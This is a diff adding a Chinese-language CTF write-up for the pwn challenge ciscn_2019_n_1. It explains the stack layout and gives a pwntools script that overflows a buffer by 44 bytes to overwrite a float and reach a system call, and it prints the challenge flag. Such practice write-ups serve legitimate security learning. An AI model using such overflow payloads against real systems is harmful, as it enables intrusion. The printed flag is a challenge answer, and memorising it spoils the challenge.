@@ -2071,6 +2071,43 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_n_1](https://ce.pwnthebox.com/challenges?type=4&id=524)
+
+先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)
+
+用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)
+
+双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)
+
+查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)
+
+查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)
+
+编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10406`，发送`payload`即可得到`PTB{7a857dc1-60e5-41a8-b615-3dd418407a0a}`。
+
+```python
+from pwn import *
+
+io = remote('redirect.do-not-trust.hacking.run', 10406)
+payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/PwnTheBox/524/1.png)
+
+------
+
 ## Pwnable.kr
 
 ### fd
